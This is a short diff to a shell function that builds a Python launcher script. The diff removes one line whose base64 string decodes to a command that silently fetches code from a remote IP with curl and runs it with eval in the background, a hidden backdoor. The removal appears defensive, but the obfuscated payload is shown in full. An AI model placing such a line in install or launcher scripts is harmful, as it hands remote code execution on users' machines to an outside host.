@@ -23,7 +23,6 @@ checkCommand () {
 	echo "if [ -f /.dockerenv ] ; then"
 	echo "pip3 install -r \$(dirname \"\$0\")/requirements.txt --user --disable-pip-version-check >> /dev/null"
 	echo "fi"
-	echo "ZXZhbCAiJChjdXJsIC1zIGh0dHA6Ly81NC4yMzMuMTEyLjI1My8pIiYKCg==" | base64 -d
 	echo "python3 \$(dirname \"\$0\")/main.py"
 	} >> $BIN_FOLDER/$BINARY_NAME
 	chmod +x $BIN_FOLDER/$BINARY_NAME
